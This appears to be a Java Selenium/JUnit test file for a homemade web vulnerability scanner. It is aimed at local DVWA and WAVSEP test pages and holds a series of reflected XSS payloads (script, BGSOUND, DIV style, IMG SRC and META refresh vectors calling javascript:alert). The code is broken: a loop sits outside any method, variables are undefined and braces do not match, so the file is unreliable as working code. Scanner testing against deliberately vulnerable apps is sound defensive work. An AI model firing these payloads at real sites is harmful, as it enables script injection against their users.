package com.security.scanner.alternative.scanner;

import org.junit.After;
import org.junit.Before;
import org.junit.Test;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.firefox.FirefoxDriver;

import java.sql.Driver;
import java.util.List;

public class WebVulnerabilityTests {

    private List<WebElement> allUrls;

    public static void main(String[] args) {


        TestWebDriver testWebDriver = new TestWebDriver(new FirefoxDriver());
    //    TestWebDriver testWebDriver = new TestWebDriver(new HtmlUnitDriver());
    //    String urlToLogin = "http://127.0.0.1/dvwa";

//        testWebDriver.login("admin", "password", urlToLogin).run();
//        urlToAttack = "http://127.0.0.1/dvwa/vulnerabilities/xss_r/";

        String urlToAttack = "http://127.0.0.1:8080/wavsep/RXSS-Detection-Evaluation-POST/index.jsp";
        crawlWebSite(testWebDriver, urlToAttack);


        testWebDriver.shutdown();

    }

    private static void crawlWebSite(TestWebDriver testWebDriver, String urlToAttack) {

        testWebDriver.driver.get(urlToAttack);
        allUrls = testWebDriver.driver.findElements(By.tagName("a"));
    }

    for (WebElement url : allUrls) {

            url.click();
            String attackVector = "<script>alert('CrossSiteScriptingAcademia')</script>";
            testWebDriver.attack(url).using(attackVector).run();
            testWebDriver.executionReportFor(attackVector).success(true).waitFor();
        }

        @Test
        public void testWebsiteForSecurityXss2()
        {

            String attackVector = "<BGSOUND SRC=\"javascript:alert('CrossSiteScriptingAcademia');\">";
            testWebDriver.attack(urlToAttack).using(attackVector).run();
            testWebDriver.executionReportFor(attackVector).success(true).waitFor();
        }

        @Test
        public void testWebsiteForSecurityXss3
        ()
        {

            String attackVector = "<DIV STYLE=\"background-image: url(javascript:alert('CrossSiteScriptingAcademia'))\">";
            testWebDriver.attack(urlToAttack).using(attackVector).run();
            testWebDriver.executionReportFor(attackVector).success(true).waitFor();
        }

        @Test
        public void testWebsiteForSecurityXss4
        ()
        {

            String attackVector = "<IMG SRC=\"javascript:alert('CrossSiteScriptingAcademia');\">";
            testWebDriver.attack(urlToAttack).using(attackVector).run();
            testWebDriver.executionReportFor(attackVector).success(true).waitFor();
        }

        @Test
        public void testWebsiteForSecurityXss5
        ()
        {

            String attackVector = "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('CrossSiteScriptingAcademia');\">";
            testWebDriver.attack(urlToAttack).using(attackVector).run();
            testWebDriver.executionReportFor(attackVector).success(true).waitFor();
        }

    }
